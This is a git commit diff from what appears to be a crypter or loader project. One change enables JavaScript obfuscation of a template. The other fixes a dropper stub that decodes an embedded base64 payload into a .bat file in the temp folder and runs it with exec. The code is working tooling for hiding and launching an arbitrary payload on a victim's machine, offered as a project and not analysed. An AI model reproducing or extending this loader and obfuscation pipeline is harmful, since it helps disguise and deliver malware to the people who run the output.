117f1327ae067d101c2cd229ea3c375f1b5f9f70
KDot227 <damndc227@gmail.com>
2024-03-13 17:00:32 -0500

    hopefully applies fix for obfuscation and encoding

--- src/obfuscator.js
+++ src/obfuscator.js
@@ -3,12 +3,20 @@ var fs = require('fs');
 
 var code = fs.readFileSync(__dirname + "\\to_compile\\template.js", "utf8");
 
-//var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
-//    compact: true,
-//    optionsPreset: 'low-obfuscation',
-//    target: 'node'
-//});
+var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
+    compact: true,
+    simplify: true,
+    stringArray: false,
+    stringArrayCallsTransform: false,
+    stringArrayIndexShift: false,
+    stringArrayRotate: false,
+    stringArrayShuffle: false,
+    stringArrayWrappersChainedCalls: false,
+    target: 'node',
+    transformObjectKeys: false,
+    unicodeEscapeSequence: true
+});
 
 //create the file fn
 
-fs.writeFileSync(__dirname + "\\to_compile\\main.js", code, "utf8");
+fs.writeFileSync(__dirname + "\\to_compile\\main.js", obfuscationResult.getObfuscatedCode(), "utf8");
--- src/to_compile/static/template.js
+++ src/to_compile/static/template.js
@@ -6,13 +6,13 @@ const exec = require('child_process').exec;
 function main() {
     var tempDir = path.join(os.tmpdir(), "KDoTemp.bat");
     var b64stuff = "BASE64ENCODEDSTUFFHERE";
-    var decoded = Buffer.from(b64stuff, 'base64').toString('ascii');
+    var decoded = Buffer.from(b64stuff, 'base64').toString('utf-8');
     fs.writeFile(tempDir, decoded, function(err) {
         if (err) {
             console.log(err);
             return;
         }
-        
+
         exec("start " + tempDir, function (err, stdout, stderr) {
             if (err) {
                 console.log(err);
